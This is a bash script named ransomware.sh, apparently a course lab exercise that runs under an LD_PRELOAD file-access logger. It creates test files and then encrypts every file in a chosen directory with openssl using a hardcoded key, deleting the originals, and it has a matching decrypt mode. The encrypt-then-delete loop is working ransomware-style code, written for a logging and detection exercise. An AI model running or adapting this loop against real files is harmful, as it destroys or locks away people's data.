#!/bin/bash

# set load preload to our fopen64, fopen, fwrite shared library
# all child-processes inherit this
export LD_PRELOAD=./logger.so

key="MICHAELTHEOLOGITIS2017030043"

ARGC=("$#")

# Create ProgressBar function
# Input is currentState($1) and totalState($2)
function ProgressBar {
# Process data
	let _progress=(${1}*100/${2}*100)/100
	let _done=(${_progress}*4)/10
	let _left=40-$_done
# Build progressbar string lengths
	_done=$(printf "%${_done}s")
	_left=$(printf "%${_left}s")

# Build progressbar strings and print the ProgressBar line
# Output example:
# Progress : [########################################] 100%
printf "\rProgress : [${_done// /#}${_left// /-}] ${_progress}%%"

}

# Creates the directory with name -n (directory) and
# places inside of it -x (number) of files

function createFilesAndDir {

# create directory, and using fopen() create the files,
# using fwrite() write to those files something :)
    ./test_aclog $directory $num_of_files
    
}


# For each .txt file it encrypts it and deletes it afterwards

function encryptFiles {

# Count of files encrypted
	count=1
	
	files="$directory/*"
	for f in $files
	do
# show progress bar
		ProgressBar ${count} ${num_of_files}
# encrypt 
		openssl enc -aes-256-ecb -pbkdf2 -in $f -out "$f.encrypt" -k $key
# remove original file
		rm $f

		((count=count+1))
	done
	printf '\nFinished!\n'
}

# For each .encrypt file it decrypts it and deletes it afterwards
function decryptFiles {
	# Count of files encrypted
	count=1
	
	files="$directory/*.encrypt"
	for f in $files
	do
# show progress bar
		ProgressBar ${count} ${num_of_files}
		
# decrypt and save the decrypted file without the .encrypt
		openssl aes-256-ecb -pbkdf2 -in $f -out ${f%.*}  -d -k $key
		
# remove old .encrypt file
		rm $f

		((count=count+1))
	done
	printf '\nFinished!\n'
}

function usage {
    echo "Usage:"
    echo "  bash ransomware.sh -n file_directory -x number_of_files [-c | -e | -d]"
    echo "Options:"
    echo "  -n    <file_directory>      The new directory which will be created"
    echo "                              for all the files to be put inside it"
    echo "								                                     "
    echo "  -x    <number_of_files>     The <number_of_files> that will either be"
    echo "                              created, encrypted or decrypted"
    echo "								                                     "
    echo "  -c                          Create <number_of_files> files inside"
    echo "                              <file_directory>."
    echo "								                                     "
    echo "  -e                          Encrypt the files inside <file_directory>"
    echo "                              (delete the original files aswell)"
    echo "								                                     "
    echo "  -d                          Decrypt the .encrypt files inside"
    echo "                              <file_directory> (delete the .encrypt"
    echo "                              files aswell)"
    echo "Example:"
    echo "  bash ransomware.sh -n file_directory -x 100 -c  //creation	"
    echo "  bash ransomware.sh -n file_directory -x 100 -e  //encryption"
    echo "  bash ransomware.sh -n file_directory -x 100 -d  //decryption"
    exit 1
}


while getopts n:cx:ed flag
do
# Check how many arguments
	if [ $ARGC -ne 5 ];
	then
		usage
	fi
    case "${flag}" in
        n) directory=${OPTARG};;
        x) num_of_files=${OPTARG};;
        c) createFilesAndDir;;
        e) encryptFiles;;
        d) decryptFiles;;
        *) usage;;
    esac
done






